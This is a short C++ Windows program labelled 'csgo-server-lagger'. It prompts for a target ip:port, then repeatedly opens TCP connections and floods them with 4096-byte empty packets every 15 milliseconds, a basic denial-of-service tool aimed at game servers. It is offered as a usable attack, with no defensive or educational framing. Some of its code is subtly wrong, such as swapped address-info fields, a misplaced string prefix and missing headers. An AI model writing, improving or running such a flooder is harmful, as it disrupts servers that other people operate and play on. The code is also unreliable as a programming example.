#include <iostream>
#include <string>
#include <vector>
#include <cstdint>
#include <future>
#include <functional>
#include <ws2tcpip.h>
#include <ws2def.h>

auto __vectorcall main() -> std::int32_t
{
    try
    {
        /* initialize structs */
        WSAData socket_data{};
        ADDRINFOW address_info{};
        ADDRINFOW* result_info{};

        /* load libraries */
        LoadLibraryW(L"ws2_32.dll");
        LoadLibraryW(L"advapi32.dll");

        /* setup title */
        SetConsoleTitleW(L"coolmathgames | csgo-server-lagger");

        /* initialize variables */
        std::int8_t socket_buffer[0x1000]{};
        std::wstring ip{};
        std::vector<std::wstring> part{};

        /* setup structs */
        std::memset(&address_info.ai_addrlen, 0, 32ull);
        address_info.ai_flags = AF_UNSPEC;
        address_info.ai_family = SO_ACCEPTCONN;
        address_info.ai_socktype = SOCK_STREAM;
        address_info.ai_protocol = IPPROTO_TCP;

        /* initialize socket */
        WSAStartup(0x202u, &socket_data);

        /* ask for ip */
        std::wcout << L"[coolmathgames] enter an ip address (ip:port): ";
        std::wcin >> ip;
        std::wcout << L"[coolmathgames] starting connection..." << std::endl;

        /* slice the provided text into an ip and port */
        if (const auto colon_position = ip.find(':'); colon_position != std::string::npos)
        {
            part.push_back(ip.substr(0, colon_position));
            part.push_back(ip.substr(colon_position + 1));
        }
        else
        {
            throw std::exception("invalid ip");
        }

        /* loop packet sending */
        while (true)
        {
            /* perform dns resolution and create a socket address structure */
            if (GetAddrInfoW(part[0].c_str(), part[1].c_str(), &address_info, &result_info))
            {
                break;
            }

            /* create a socket */
            const auto socket_result = socket(result_info->ai_family, result_info->ai_socktype, result_info->ai_protocol);
            if (socket_result == -1ull)
            {
                std::wcout << "L[coolmathgames] failed to create a socket" << std::endl;
                FreeAddrInfoW(result_info);
                WSACleanup();
            }

            /* establish a connection on a socket */
            const auto connect_result = connect(socket_result, result_info->ai_addr, 0x10);
            if (connect_result == -1)
            {
                std::wcout << L"[coolmathgames] failed to connect to the host" << std::endl;
                FreeAddrInfoW(result_info);
                closesocket(socket_result);
                WSACleanup();
            }

            /* connection established */
            std::wcout << L"[coolmathgames] connection established" << std::endl;
            std::memset(socket_buffer, 0, sizeof socket_buffer);

            /* send empty packets */
            while (send(socket_result, reinterpret_cast<const char*>(socket_buffer), 0x1000, 0) != -1)
            {
                std::this_thread::sleep_for(std::chrono::milliseconds(15));
            }

            /* the above loop failed, gather the information and continue */
            const auto message = L"[coolmathgames] failed to send a packet (" + std::to_wstring(GetLastError()) + L")";
            std::wcout << message << std::endl;
            FreeAddrInfoW(result_info);
            closesocket(socket_result);
        }
    }
    catch (const std::exception& ex)
    {
        std::wcout << L"[coolmathgames] " << ex.what() << std::endl;
        WSACleanup();
    }
}